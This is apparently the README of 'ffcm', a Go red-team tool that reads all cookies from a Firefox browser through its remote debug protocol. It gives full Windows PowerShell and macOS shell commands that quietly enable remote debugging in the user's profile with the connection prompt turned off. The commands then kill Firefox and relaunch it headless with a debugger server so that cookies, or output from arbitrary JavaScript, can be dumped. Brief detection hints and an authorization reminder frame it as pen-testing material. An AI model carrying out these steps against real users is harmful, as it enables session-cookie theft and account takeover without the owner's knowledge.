# Firefox - Debug Client for Cookie Access

Connect to Firefox debug port and issue Javascript commands and read responses - useful for grabbing cookies.

It works both on `Windows` and `macOS`.

![ffcm output](https://embracethered.com/blog/images/2020/firefox/output.png)

## Technical details

The tool is written in `Golang` using concurrent sender/receiver routines. It creates a TCP connection to Firefox using `net.Dial` and then sends various method calls as JSON serialized objects to eventually run Javascript commands using the `evaluateJSAsync` API to access `Services.cookies.cookies`. 

There is likely a much better/easier way to implemented this, as Firefox recently (since version 78) added a `Network.getAllCookies` Debug API as well.

The Mozilla documentation for the `Remote Debug Protocol` is located [here](https://docs.firefox-dev.tools/backend/protocol.html).

The code leverages a single struct for 5 different "kind of" messages to the server. 

The structure is named `wireMessage` and represents all possible JSON requests/responses. Due to the use of a single message type for all requests/responses it can get a bit messy trying to understand the code.

## Inspired by Cookie Crimes

What inspired me to research this for Firefox? Go check out [Cookie Crimes](https://github.com/defaultnamehere/cookie_crimes) for Chrome by @mangopdf.

## Basic usage

Assuming you have a Firefox instance to connect to and its listening at `localhost:9222`, just run:

```
.\ffcm.exe 
```

The result is cookies in the form of `name:value:domain`

![ffcm output](https://embracethered.com/blog/images/2020/firefox/output.png)

### Command line options

* **-server**: the name of the debug server, by default localhost
* **-port**: the port of the debug server, by default set to use 9222
* **-command**: JavaScript command to run (by default it iterates and returns cookies name/value pairs)
* **-log**: flag that will enable logging to stdout for debug purposes, by default not specified


**Note:** By default the debug port of Firefox is not enabled. See the section below on how to setup and enable Firefox remote debug protocol.

### Want to run some other code in the debugger?

You can pass in `-command` command line argument to run other Javascript code.

## Enabling remote debugging

Enabling remote debugging is not (yet) built into the tool at this point. 

To enable remote debugging the following Firefox settings have to be updated:

* *devtools.debugger.remote-enabled*
* *devtools.debugger.prompt-connection*
* *devtools.chrome.enabled*

One can update the `user.js` file in profile folder which seems to get merged into the `prefs.js` file. If it does not work via the `user.js` file, you can try to update the `pref.js` file directly - but for me the `user.js` file has worked well. 

Firefox needs a restart for them to be picked up.

Some more experiementing with `prefs.js` might be interesting - maybe there is a way that does not require Firefox to restart.

Following are examples for Windows and macOS.

### Windows setup

First, retrieve the users's profile via:

```
$firstprofile = (gci $env:APPDATA\Mozilla\Firefox\Profiles\*.default-rel* -Directory | Select-Object -First 1).FullName
```

And add the following lines to the `user.js` file (by default this file does not exist):

```
write 'user_pref("devtools.chrome.enabled", true);' | out-file $firstprofile\user.js -Append -Encoding ascii
write 'user_pref("devtools.debugger.remote-enabled", true);'  | out-file $firstprofile\user.js -Append -Encoding ascii
write 'user_pref("devtools.debugger.prompt-connection", false);' | out-file $firstprofile\user.js -Append -Encoding ascii
```

That's it, next time Firefox starts the settings will be applied.

### Connecting and launching ffcm

Here are two commands that might come in handy when trying this, first is to terminate all instances of Firefox:
```
Get-Process -Name firefox | Stop-Proces
```

And launching Firefox with the `-start-debugger-server` option:

```
Start-Process 'C:\Program Files\Mozilla Firefox\firefox.exe' -ArgumentList "-start-debugger-server 9222 -headless"
```

After that you can launch `ffcm.exe` the results are sent to `stdout`.

### End to end demo scenario on Windows

```
$firstprofile = (gci $env:APPDATA\Mozilla\Firefox\Profiles\*.default-rel* -Directory | Select-Object -First 1).FullName

write 'user_pref("devtools.chrome.enabled", true);' | out-file $firstprofile\user.js -Append -Encoding ascii
write 'user_pref("devtools.debugger.remote-enabled", true);'  | out-file $firstprofile\user.js -Append -Encoding ascii
write 'user_pref("devtools.debugger.prompt-connection", false);' | out-file $firstprofile\user.js -Append -Encoding ascii

Get-Process -Name firefox | Stop-Proces
Start-Process 'C:\Program Files\Mozilla Firefox\firefox.exe' -ArgumentList "-start-debugger-server 9222 -headless"

./ffcm.exe 
[...results ...]

Get-Process -Name firefox | Stop-Proces

```

### macOS setup and example

Things are very similar to Windows, besides diferent folder names and this example is using `bash`.

```
firstprofile=$(echo $HOME/Library/Application\ Support/Firefox/Profiles/*.default-rel*)

echo 'user_pref("devtools.chrome.enabled", true);'              >> "$firstprofile/user.js"
echo 'user_pref("devtools.debugger.remote-enabled", true);'     >> "$firstprofile/user.js"
echo 'user_pref("devtools.debugger.prompt-connection", false);' >> "$firstprofile/user.js"
```

#### Killing existing instances

To enable the new settings, a fresh instance of Firefox needs to start up. Can be done with either `pkill firefox` or regular `kill` command `ps aux | grep -ie firefox | awk '{print $2}' | xargs kill -9`

### Launching Firefox

```
/Applications/Firefox.app/Contents/MacOS/firefox --start-debugger-server 9222 &
```

Now you can run `./ffcm` and emjoy the results. Consider cleaning up and reverting changes at the end also.


## Detections and alerting

* Looking for `-start-debugger-server` command line arguments to Firefox
* Modification of `user.js` and `prefs.js` files, especially modifications to the 3 settings related to enabling remote debugging


## Build

Very simple, get the code (`main.go` file) and build it.

### Get the code

```
go get github.com/wunderwuzzi23/firefox-cookiemonster
```

or 

```
git clone https://github.com/wunderwuzzi23/firefox-cookiemonster
```

### Build command

```
build -o ffcm main.go
```

#### Cross compile

If you code Go on Linux or WSL you can cross-compile with:

```
$ env GOARCH=amd64 GOOS=windows go build -o ffcm.exe main.go
```

### Interesting behavior with cross compiled Go binaries!

Windows Defender seems to be doing **some extra security scans for cross compiled binaries**. I got a popup from Defender saying it might take up to 10 seconds for the binary to run because its being scanned... It still ran without issues though. When compiling natively on Windows there was no extra scan or popup.

## Blog

If you like this stuff, check out the [Embrace the Red](https://embracethered.com) blog.

## Background and more info about browser remote debugging

There is more background info about the tool and browser remote debugging on my blog at: 

* [Remote Debugging with Firefox](https://embracethered.com/blog/posts/2020/cookies-on-firefox/)
* [Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
* [Cookie Crimes and the new Microsoft Edge Browser](https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/)


## Final remarks

**As always the reminder that pen testing requires authorization from proper stakeholders.** 

This information is provided to improve the understanding of attacks and build better mitigations and improve detections.

